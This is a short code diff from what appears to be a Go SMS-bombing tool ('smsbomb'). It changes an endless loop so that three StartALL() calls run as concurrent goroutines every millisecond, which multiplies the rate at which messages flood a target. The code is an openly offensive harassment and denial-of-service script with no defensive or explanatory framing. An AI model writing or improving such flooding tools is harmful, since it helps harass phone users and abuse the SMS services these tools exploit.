@@ -20,9 +20,9 @@ func main() {
 
 	fmt.Println("loading sms :: atomic/scripts/smsbomb")
 	for {
-		StartALL()
-		StartALL()
-		StartALL()
+		go StartALL()
+		go StartALL()
+		go StartALL()
 		time.Sleep(time.Millisecond * 1)
 	}
 }
